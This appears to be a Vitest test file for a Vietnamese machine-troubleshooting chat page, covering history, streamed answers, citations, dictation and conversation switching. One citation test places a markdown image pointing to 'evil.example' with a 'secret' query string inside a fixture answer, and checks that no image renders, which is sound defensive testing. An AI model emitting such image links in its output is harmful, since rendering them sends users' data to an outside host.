import { fireEvent, render, screen, waitFor } from "@testing-library/react";
import { createMemoryRouter, RouterProvider } from "react-router-dom";
import { afterEach, describe, expect, it, vi } from "vitest";
import { AuthProvider } from "@/hooks/auth";
import { AuthClient } from "@/services/auth-api";
import { MicRecorder } from "@/services/mic-recorder";
import { ConversationsPage } from "./conversations";

vi.mock("@/services/mic-recorder", async (actual) => ({
  ...(await actual<typeof import("@/services/mic-recorder")>()),
  MicRecorder: {
    open: vi.fn(async () => ({
      stop: async () => undefined,
      toWav: () => new Blob(["RIFF"], { type: "audio/wav" }),
    })),
  },
}));

const chat = (id: string, title: string) => ({
  id,
  title,
  created_at: "2026-11-03T08:00:00Z",
  updated_at: "2026-11-03T08:00:00Z",
});

/** An SSE body the test writes to; aborting the request errors the body. */
function openStream(signal: AbortSignal | null | undefined) {
  const encoder = new TextEncoder();
  let push!: (frame: string) => void;
  let end!: () => void;
  const body = new ReadableStream<Uint8Array>({
    start(controller) {
      push = (frame) => controller.enqueue(encoder.encode(frame));
      end = () => controller.close();
      signal?.addEventListener("abort", () =>
        controller.error(new DOMException("Aborted", "AbortError")),
      );
    },
  });
  return {
    response: new Response(body, {
      headers: { "Content-Type": "text/event-stream" },
    }),
    push,
    end,
    aborted: () => signal?.aborted ?? false,
  };
}

type Stream = ReturnType<typeof openStream>;

function serve(
  histories: Record<string, unknown[]>,
  createGate?: Promise<void>,
  transcription?: () => Promise<Response>,
) {
  const streams: Stream[] = [];
  const speechCalls: unknown[] = [];
  const created: unknown[] = [];
  const fetch = vi.fn(async (url: string, init?: RequestInit) => {
    const method = init?.method ?? "GET";
    if (url.endsWith("/auth/refresh"))
      return Response.json({ detail: "x" }, { status: 401 });
    if (url === "/v1/conversations" && method === "GET")
      return Response.json({
        conversations: [chat("chat-a", "Máy A"), chat("chat-b", "Máy B")],
      });
    if (url === "/v1/conversations" && method === "POST") {
      const body = JSON.parse(init!.body as string);
      created.push(body);
      await createGate;
      return Response.json(chat("chat-new", body.title), { status: 201 });
    }
    const history = url.match(/^\/v1\/conversations\/([^/]+)\/history$/);
    if (history)
      return Response.json({
        conversation_id: history[1],
        messages: histories[history[1]] ?? [],
        truncated: false,
      });
    if (url === "/v1/speech/transcriptions") {
      speechCalls.push(init?.body);
      return (await transcription?.()) ?? Response.json({ text: "" });
    }
    if (url.endsWith("/stream")) {
      const stream = openStream(init?.signal);
      streams.push(stream);
      return stream.response;
    }
    throw new Error(`Unexpected request: ${method} ${url}`);
  });
  vi.stubGlobal("fetch", fetch);
  return { fetch, streams, created, speechCalls };
}

function show(path: string) {
  const router = createMemoryRouter(
    [{ path: "/ask/:threadId?", element: <ConversationsPage /> }],
    { initialEntries: [path] },
  );
  render(
    <AuthProvider client={new AuthClient({ crossTab: false })}>
      <RouterProvider router={router} />
    </AuthProvider>,
  );
  return router;
}

function ask(text: string) {
  fireEvent.change(screen.getByTestId("chat-input"), {
    target: { value: text },
  });
  fireEvent.click(screen.getByTestId("chat-send"));
}

afterEach(() => vi.unstubAllGlobals());

describe("ConversationsPage", () => {
  it("shows saved history in order when a conversation is reopened", async () => {
    serve({
      "chat-a": [
        { role: "user", text: "Lỗi E12" },
        { role: "assistant", text: "Kiểm tra cảm biến." },
        { role: "user", text: "Vẫn lỗi" },
      ],
    });
    show("/ask/chat-a");
    const questions = await screen.findAllByTestId("chat-question");
    expect(questions.map((item) => item.textContent)).toEqual([
      "Lỗi E12",
      "Vẫn lỗi",
    ]);
    expect(screen.getByTestId("chat-answer")).toHaveTextContent(
      "Kiểm tra cảm biến.",
    );
  });

  it("creates a conversation on first send and replaces provisional text with the saved answer", async () => {
    const { streams, created } = serve({});
    const router = show("/ask");
    await screen.findByRole("option", { name: "Máy A" });
    ask("Máy ép số 3 báo lỗi E12");

    await waitFor(() => expect(streams).toHaveLength(1));
    expect(created).toEqual([{ title: "Máy ép số 3 báo lỗi E12" }]);
    expect(router.state.location.pathname).toBe("/ask/chat-new");
    streams[0].push('event: text\ndata: {"delta":"Kiểm tra tạm"}\n\n');
    const answer = await screen.findByTestId("chat-answer");
    await waitFor(() => expect(answer).toHaveTextContent("Kiểm tra tạm"));
    expect(answer).toHaveAttribute("data-status", "streaming");

    streams[0].push(
      'event: complete\ndata: {"answer":"Kiểm tra cảm biến áp suất."}\n\n',
    );
    await waitFor(() => expect(answer).toHaveAttribute("data-status", "saved"));
    expect(answer).toHaveTextContent("Kiểm tra cảm biến áp suất.");
    expect(answer).not.toHaveTextContent("Kiểm tra tạm");
  });

  it("links only saved citations and opens their excerpt", async () => {
    const citation = {
      marker: "S1",
      evidence_id: "chunk-71",
      title: "MR-JE manual",
      excerpt: "E12: kiểm tra cảm biến áp suất.",
      location: "trang 71",
    };
    serve({
      "chat-a": [
        { role: "user", text: "Lỗi E12" },
        {
          role: "assistant",
          text: "Kiểm tra cảm biến [S1]. Ca cũ [S4]. ![x](https://evil.example/?d=secret) [giả](#cite-S9)",
          citations: [citation],
        },
      ],
    });
    show("/ask/chat-a");
    const marker = await screen.findByRole("button", { name: "Mở nguồn S1" });
    expect(
      screen.queryByRole("button", { name: "Mở nguồn S4" }),
    ).not.toBeInTheDocument();
    expect(screen.getByTestId("chat-answer")).toHaveTextContent("[S4]");

    expect(document.querySelector("img")).toBeNull();
    expect(
      screen.queryByRole("button", { name: "Mở nguồn S9" }),
    ).not.toBeInTheDocument();

    fireEvent.click(marker);
    const card = screen.getByTestId("citation-card");
    expect(card).toHaveTextContent("MR-JE manual");
    expect(card).toHaveTextContent("trang 71");
    expect(card).toHaveTextContent("E12: kiểm tra cảm biến áp suất.");
  });

  it("says when the knowledge search found nothing or failed", async () => {
    const { streams } = serve({});
    show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    ask("Lỗi E12");
    await waitFor(() => expect(streams).toHaveLength(1));
    streams[0].push(
      'event: complete\ndata: {"answer":"Không có.","citations":[],"search":"unavailable"}\n\n',
    );
    expect(
      await screen.findByText(
        "Không tra cứu được kho tri thức cho câu hỏi này.",
      ),
    ).toBeInTheDocument();
  });

  it("puts a transcript in the composer for editing and sends the edited text", async () => {
    const { streams, speechCalls } = serve({}, undefined, async () =>
      Response.json({ text: "máy ép báo lỗi e mười hai" }),
    );
    show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    fireEvent.click(screen.getByTestId("dictation"));
    await screen.findByRole("button", { name: "Dừng ghi âm" });
    fireEvent.click(screen.getByTestId("dictation"));

    const input = screen.getByTestId("chat-input") as HTMLTextAreaElement;
    await waitFor(() => expect(input.value).toBe("máy ép báo lỗi e mười hai"));
    expect(speechCalls[0]).toBeInstanceOf(FormData);
    expect(streams).toHaveLength(0);

    fireEvent.change(input, { target: { value: "Máy ép báo lỗi E12" } });
    fireEvent.click(screen.getByTestId("chat-send"));
    await waitFor(() => expect(streams).toHaveLength(1));
    expect(screen.getByTestId("chat-question")).toHaveTextContent(
      "Máy ép báo lỗi E12",
    );
  });

  it("shows a speech failure and ignores a transcript that arrives after switching chats", async () => {
    let respond!: (response: Response) => void;
    serve(
      { "chat-b": [] },
      undefined,
      () => new Promise<Response>((resolve) => (respond = resolve)),
    );
    const router = show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    fireEvent.click(screen.getByTestId("dictation"));
    await screen.findByRole("button", { name: "Dừng ghi âm" });
    fireEvent.click(screen.getByTestId("dictation"));
    await waitFor(() => expect(respond).toBeDefined());
    await router.navigate("/ask/chat-b");
    await waitFor(() =>
      expect(screen.getByTestId("conversation-select")).toHaveValue("chat-b"),
    );
    respond(Response.json({ text: "câu cũ" }));
    await waitFor(() =>
      expect(screen.getByTestId("dictation")).not.toBeDisabled(),
    );
    expect(
      (screen.getByTestId("chat-input") as HTMLTextAreaElement).value,
    ).toBe("");

    fireEvent.click(screen.getByTestId("dictation"));
    await screen.findByRole("button", { name: "Dừng ghi âm" });
    fireEvent.click(screen.getByTestId("dictation"));
    await waitFor(() => expect(respond).toBeDefined());
    respond(Response.json({ detail: "x" }, { status: 503 }));
    expect(await screen.findByTestId("dictation-error")).toHaveTextContent(
      "Không nhận dạng được giọng nói lúc này",
    );
  });

  it("opens the microphone once when the mic button is pressed twice quickly", async () => {
    serve({});
    const open = vi.mocked(MicRecorder.open);
    open.mockClear();
    show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    fireEvent.click(screen.getByTestId("dictation"));
    fireEvent.click(screen.getByTestId("dictation"));
    await screen.findByRole("button", { name: "Dừng ghi âm" });
    expect(open).toHaveBeenCalledTimes(1);
  });

  it("titles a new chat from a multi-line first message without line breaks", async () => {
    const { streams, created } = serve({});
    show("/ask");
    await screen.findByRole("option", { name: "Máy A" });
    ask("  Máy ép số 3\nlog:\tE12  ");
    await waitFor(() => expect(streams).toHaveLength(1));
    expect(created).toEqual([{ title: "Máy ép số 3 log: E12" }]);
  });

  it("does not return to a new chat that finished creating after the user left", async () => {
    let finishCreate!: () => void;
    const { streams } = serve(
      { "chat-b": [{ role: "user", text: "Câu hỏi của máy B" }] },
      new Promise<void>((resolve) => (finishCreate = resolve)),
    );
    const router = show("/ask");
    await screen.findByRole("option", { name: "Máy A" });
    ask("Câu hỏi mới");
    await router.navigate("/ask/chat-b");
    await screen.findByText("Câu hỏi của máy B");
    finishCreate();

    await screen.findByRole("option", { name: "Câu hỏi mới" });
    expect(router.state.location.pathname).toBe("/ask/chat-b");
    expect(streams).toHaveLength(0);
    expect(screen.queryByText("Câu hỏi mới", { selector: "p" })).toBeNull();
    expect(screen.getByTestId("chat-send")).toBeInTheDocument();
  });

  it("marks an answer whose stream ended without a final event as unconfirmed", async () => {
    const { streams } = serve({});
    show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    ask("Lỗi E12");
    await waitFor(() => expect(streams).toHaveLength(1));
    streams[0].push('event: text\ndata: {"delta":"partial"}\n\n');
    streams[0].end();
    const answer = await screen.findByTestId("chat-answer");
    await waitFor(() =>
      expect(answer).toHaveAttribute("data-status", "unconfirmed"),
    );
    expect(
      screen.getByRole("button", { name: "Tải lại cuộc trò chuyện" }),
    ).toBeInTheDocument();
  });

  it("shows an agent error without sending again", async () => {
    const { streams, fetch } = serve({});
    show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    ask("Lỗi E12");
    await waitFor(() => expect(streams).toHaveLength(1));
    streams[0].push(
      'event: error\ndata: {"code":"provider_error","message":"Model failed.","retryable":true}\n\n',
    );
    const answer = await screen.findByTestId("chat-answer");
    await waitFor(() =>
      expect(answer).toHaveAttribute("data-status", "failed"),
    );
    expect(answer).toHaveTextContent("Model failed.");
    const streamCalls = fetch.mock.calls.filter(([url]) =>
      String(url).endsWith("/stream"),
    );
    expect(streamCalls).toHaveLength(1);
  });

  it("stops the old answer when switching conversations and ignores its late text", async () => {
    const { streams } = serve({
      "chat-b": [{ role: "user", text: "Câu hỏi của máy B" }],
    });
    const router = show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    ask("Câu hỏi của máy A");
    await waitFor(() => expect(streams).toHaveLength(1));

    await router.navigate("/ask/chat-b");
    await screen.findByText("Câu hỏi của máy B");
    expect(streams[0].aborted()).toBe(true);
    expect(screen.queryByText("Câu hỏi của máy A")).not.toBeInTheDocument();
    expect(screen.queryByTestId("chat-answer")).not.toBeInTheDocument();
    expect(screen.getByTestId("chat-send")).toBeInTheDocument();
  });
});
